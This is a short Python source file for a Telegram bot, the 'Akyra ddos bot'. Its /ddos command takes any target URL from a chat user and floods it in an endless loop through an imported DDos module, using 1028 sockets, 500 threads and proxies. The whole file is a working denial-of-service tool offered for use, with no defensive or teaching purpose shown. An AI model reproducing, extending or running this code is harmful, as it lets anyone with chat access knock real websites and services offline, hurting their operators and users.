# Импотируем модули
import DDos
import telebot
import settings as cfg
# Запуск бота
import telebot

bot = telebot.TeleBot(cfg.token, parse_mode=None)
# Команда /start
@bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "Hi sir , type /help")
# Команда /help
@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "welcome to Akyra ddos bot:\n /ddos - start a ddos attack \n /help - all command \n /author - author of bot")
# Команда /ddos
@bot.message_handler(commands=['ddos'])
def ddosa (message):
    msg = bot.send_message(message.chat.id, "target :!")
    bot.register_next_step_handler(msg, ddoss)
def ddoss (message):
  url = message.text
  bot.send_message(message.chat.id, "attack started")
  while True:
    DDos.DDos(url, sockets = 1028, threads = 500, use_proxies = True)
   
# Команда /author
@bot.message_handler(commands=['author'])
def author (message):
  bot.send_message(message.chat.id, "@vilgax and 0xSn1kky =)")
  
bot.polling(none_stop=True, interval=0)
